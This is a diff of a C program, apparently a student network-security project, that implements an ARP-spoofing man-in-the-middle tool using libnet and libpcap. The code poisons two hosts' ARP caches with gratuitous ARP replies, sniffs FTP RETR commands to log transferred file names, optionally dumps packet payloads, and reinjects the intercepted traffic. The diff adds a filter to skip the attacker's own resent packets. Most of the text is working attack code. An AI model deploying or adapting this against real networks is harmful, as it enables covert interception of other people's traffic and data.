@@ -4,8 +4,8 @@
 #include <signal.h>
 #include <libnet.h>
 #include <pcap.h>
-#include <arpa/inet.h> // ntohs
-#include <net/ethernet.h>
+#include <arpa/inet.h>		// ntohs
+#include <net/ethernet.h>	// struct ether_header
 
 typedef struct s_vars
 {
@@ -20,14 +20,15 @@ typedef struct s_vars
 
 pcap_t	*g_handle;
 
-void		get_args(int ac, char **av, t_vars *vars);
-u_int8_t	*get_own_mac(libnet_t *l);
-void		send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
-			u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l);
-void 		packet_handler(u_char *args, 
-			const struct pcap_pkthdr *packet_header, const u_char *packet_body);
-pcap_t 		*open_device(char *filter_exp);
-void		handle_signal(int signal);
+void			get_args(int ac, char **av, t_vars *vars);
+u_int8_t		*get_own_mac(libnet_t *l);
+void			send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
+					u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l);
+void			handle_signal(int signal);
+pcap_t 			*open_device(char *filter_exp);
+void 			packet_handler(u_char *args, 
+					const struct pcap_pkthdr *packet_header,
+					const u_char *packet);
 const u_char	*get_payload(const u_char *packet);
 
 int main(int ac, char **av)
@@ -54,7 +55,12 @@ int main(int ac, char **av)
 	signal(SIGINT, handle_signal);
 	printf("Listening...\n");
 
-	g_handle = open_device(NULL);
+	// Filter: ignore packets resended from attacker
+	char filter_str[50];
+	sprintf(filter_str, "not ether src %02x:%02x:%02x:%02x:%02x:%02x",
+			vars.mac_attacker[0], vars.mac_attacker[1], vars.mac_attacker[2],
+			vars.mac_attacker[3], vars.mac_attacker[4], vars.mac_attacker[5]);
+	g_handle = open_device(filter_str);
 	pcap_loop(g_handle, 0, packet_handler, (u_char *)&vars);
 
 	// Disinfect arp tables
@@ -154,59 +160,9 @@ void	send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
 		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
 }
 
-void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
-		const u_char *packet_body)
+void handle_signal(int signal)
 {
-	t_vars *vars = (t_vars *)args;
-	struct ether_header *eth_header;
-	eth_header = (struct ether_header *)packet_body;
-
-	if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) // If ARP packet
-	{
-		u_int8_t opcode = (u_int8_t)*(packet_body + 14 + 7);
-		if (opcode == 1) // If ARP request
-		{
-			u_int32_t target_ip = *(u_int32_t *)(packet_body + 14 + 24);
-			if (target_ip == vars->ip_target)
-				send_gratuitous_arp(vars->mac_attacker, vars->ip_target,
-						vars->mac_src, vars->ip_src, vars->l);
-			if (target_ip == vars->ip_src)
-				send_gratuitous_arp(vars->mac_attacker, vars->ip_src,
-						vars->mac_target, vars->ip_target, vars->l);
-		}
-	}
-	else
-	{
-		const u_char *payload = get_payload(packet_body);
-		if (payload && !memcmp("RETR", payload, 4)
-			&& memcmp(vars->mac_attacker, eth_header->ether_shost, 6)) // attacker mac != source mac
-			printf("Transfering: %s\n", payload + 5);
-		if (vars->verbose)
-		{
-			uint32_t src_ip = *(uint32_t *)(packet_body + 14 + 12);
-			uint32_t dst_ip = *(uint32_t *)(packet_body + 14 + 16);
-			int payload_len = packet_header->caplen - (int)(payload - packet_body);
-			printf("%s -> %s - ", libnet_addr2name4(src_ip, LIBNET_DONT_RESOLVE),
-					libnet_addr2name4(dst_ip, LIBNET_DONT_RESOLVE));
-			for (int i = 0; i < payload_len; i++)
-				printf("%c", payload[i]);
-			printf("\n");
-		}
-		// Resend packet
-		/*
-		if (!memcmp(vars->mac_src, eth_header->ether_shost, 6))
-		{
-			memcpy((void *)(packet_body + 6), packet_body, 6);
-			memcpy((void *)(packet_body), vars->mac_target, 6);
-		}
-		else if (!memcmp(vars->mac_target, eth_header->ether_dhost, 6))
-		{
-			memcpy((void *)(packet_body + 6), packet_body, 6);
-			memcpy((void *)packet_body, vars->mac_src, 6);
-		}
-		*/
-		pcap_inject(g_handle, packet_body, packet_header->caplen);
-	}
+	pcap_breakloop(g_handle);
 }
 
 pcap_t *open_device(char *filter_exp)
@@ -250,14 +206,54 @@ pcap_t *open_device(char *filter_exp)
 	return (handle);
 }
 
-void handle_signal(int signal)
+void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
+		const u_char *packet)
 {
-	pcap_breakloop(g_handle);
+	t_vars *vars = (t_vars *)args;
+	struct ether_header *eth_header;
+	eth_header = (struct ether_header *)packet;
+
+	if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) // If ARP packet
+	{
+		u_int8_t opcode = (u_int8_t)*(packet + 14 + 7);
+		if (opcode == 1) // If ARP request
+		{
+			u_int32_t target_ip = *(u_int32_t *)(packet + 14 + 24);
+			if (target_ip == vars->ip_target)
+				send_gratuitous_arp(vars->mac_attacker, vars->ip_target,
+						vars->mac_src, vars->ip_src, vars->l);
+			if (target_ip == vars->ip_src)
+				send_gratuitous_arp(vars->mac_attacker, vars->ip_src,
+						vars->mac_target, vars->ip_target, vars->l);
+		}
+	}
+	else
+	{
+		// Print file name to transfer
+		const u_char *payload = get_payload(packet);
+		if (payload && !memcmp("RETR", payload, 4))
+			printf("Transfering: %s\n", payload + 5);
+
+		// Verbose option
+		if (vars->verbose)
+		{
+			uint32_t src_ip = *(uint32_t *)(packet + 14 + 12);
+			uint32_t dst_ip = *(uint32_t *)(packet + 14 + 16);
+			int payload_len = packet_header->caplen - (int)(payload - packet);
+			printf("%s -> %s- ", libnet_addr2name4(src_ip, LIBNET_DONT_RESOLVE),
+					libnet_addr2name4(dst_ip, LIBNET_DONT_RESOLVE));
+			for (int i = 0; i < payload_len; i++)
+				printf("%c", payload[i]);
+			printf("\n");
+		}
+		// Resend packet
+		pcap_inject(g_handle, packet, packet_header->caplen);
+	}
 }
 
 /*
  * - Ethernet header is always 14 bytes
- * - IP header length is always in a 4 byte integer at bit offset 4 of the IP header
+ * - IP header length is always in a 4 byte integer at bit 4 of the IP header
  * - TCP header length is always in a 4 byte int at byte 12 of the TCP header
  */
 const u_char *get_payload(const u_char *packet)
